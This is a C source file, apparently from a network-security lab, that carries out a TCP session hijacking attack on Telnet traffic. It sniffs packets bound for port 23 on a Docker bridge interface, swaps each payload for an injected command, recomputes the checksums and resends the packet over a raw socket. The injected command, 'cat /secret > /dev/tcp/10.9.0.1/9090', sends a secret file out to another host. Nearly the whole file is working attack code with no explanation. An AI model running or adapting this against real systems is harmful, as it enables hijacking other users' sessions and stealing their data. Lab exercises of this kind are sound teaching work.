
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <net/ethernet.h>
#include <netdb.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pcap/pcap.h>

#define PACKET(Name, Header_T)                                                 \
	typedef struct {                                                           \
		Header_T header;                                                       \
		u_char data[];                                                         \
	} __attribute__((packed)) Name

PACKET(eth_t, struct ether_header);
PACKET(ip_t, struct iphdr);
PACKET(tcp_t, struct tcphdr);

unsigned short in_checksum(unsigned short *data, int length) {
	unsigned short *curr = data;
	unsigned int sum = 0;

	while (length > 1) {
		sum += *curr++;
		length -= 2;
	}

	if (length == 1) {
		unsigned short temp = 0;
		*(u_char *)&temp = *(u_char *)curr;
		sum += temp;
	}

	while (sum >> 16) {
		sum = (sum & 0xffff) + (sum >> 16);
	}

	return (unsigned short)(~sum);
}

typedef struct {
	uint32_t src_addr;
	uint32_t dst_addr;
	uint8_t _placeholder;
	uint8_t protocol;
	uint16_t tcp_len;
} psh_t;

void send_modified_packet(u_char *pkt_buf, const char *cmd) {
	eth_t *eth = (eth_t *)pkt_buf;
	if (ntohs(eth->header.ether_type) != ETHERTYPE_IP)
		return;

	ip_t *ip = (ip_t *)eth->data;
	if (ip->header.protocol != IPPROTO_TCP)
		return;

	tcp_t *tcp = (tcp_t *)ip->data;

	u_char *payload_ptr = tcp->data;
	u_int cmd_len = strlen(cmd);
	memcpy(tcp->data, cmd, cmd_len);

	int total_ip_len = sizeof(ip_t) + sizeof(tcp_t) + cmd_len;
	ip->header.tot_len = htons(total_ip_len);

	// 5. Recalculate IP Checksum
	ip->header.check = 0;
	ip->header.check = in_checksum((unsigned short *)ip, sizeof(ip_t));

	// 6. Recalculate TCP Checksum with Pseudo-Header
	tcp->header.check = 0;
	int tcp_segment_len = sizeof(tcp_t) + cmd_len;

	psh_t psh;
	psh.src_addr = ip->header.saddr;
	psh.dst_addr = ip->header.daddr;
	psh._placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_len = htons(tcp_segment_len);

	u_char pseudo_buff[4096];
	memcpy(pseudo_buff, &psh, sizeof(psh_t));
	memcpy(pseudo_buff + sizeof(psh_t), tcp, tcp_segment_len);

	tcp->header.check = in_checksum((unsigned short *)pseudo_buff,
									sizeof(psh_t) + tcp_segment_len);

	// 7. Send packet using AF_INET raw socket (Kernel handles Link Layer)
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (sock < 0) {
		perror("Socket creation failed");
		return;
	}

	int one = 1;
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = tcp->header.dest;
	sin.sin_addr.s_addr = ip->header.daddr;

	char src_ip[INET_ADDRSTRLEN];
	char dst_ip[INET_ADDRSTRLEN];

	inet_ntop(AF_INET, &ip->header.saddr, src_ip, INET_ADDRSTRLEN);
	inet_ntop(AF_INET, &ip->header.daddr, dst_ip, INET_ADDRSTRLEN);

	u_short src_port = ntohs(tcp->header.source);
	u_short dst_port = ntohs(tcp->header.dest);

	printf("Hijacking TCP session (src=%s:%hu dst=%s:%hu) with seq: %u\n",
		   src_ip, src_port, dst_ip, dst_port, ntohl(tcp->header.seq));

	sendto(sock, ip, total_ip_len, 0, (struct sockaddr *)&sin, sizeof(sin));

	close(sock);
}

void sniff_tcp(u_char *user, const struct pcap_pkthdr *header,
			   const u_char *packet) {
	u_char *pkt_copy = malloc(header->caplen);
	if (pkt_copy) {
		memcpy(pkt_copy, packet, header->caplen);
	}

	const char *new_payload = "\r cat /secret > /dev/tcp/10.9.0.1/9090 \r\n";

	send_modified_packet(pkt_copy, new_payload);

	free(pkt_copy);
}

#define LOG_ON_ERROR(exp, handle)                                              \
	if (exp != 0) {                                                            \
		pcap_perror(handle, "Error: ");                                        \
		exit(EXIT_FAILURE);                                                    \
	}

void apply_filter(pcap_t *handle, char *filter_exp) {
	struct bpf_program fp;
	bpf_u_int32 net;

	pcap_compile(handle, &fp, filter_exp, 1, net);
	LOG_ON_ERROR(pcap_setfilter(handle, &fp), handle);
}

char *find_bridge_interface(pcap_if_t *alldevsp) {
	pcap_if_t *current = alldevsp;

	while (current != NULL) {
		if (current->name != NULL) {
			if (strncmp(current->name, "br-", 3) == 0) {
				return current->name;
			}
		}
		current = current->next;
	}

	return NULL;
}

int main() {
	pcap_if_t *alldevsp = NULL;
	char err_buff[PCAP_ERRBUF_SIZE] = {0};

	pcap_findalldevs(&alldevsp, err_buff);
	char *bridge_iface = find_bridge_interface(alldevsp);

	pcap_t *handle = pcap_open_live(bridge_iface, 262144, 1, 1000, err_buff);
	apply_filter(handle, "tcp dst port 23");

	printf("Running on interface %s\n", bridge_iface);

	pcap_loop(handle, -1, sniff_tcp, NULL);

	pcap_close(handle);
}
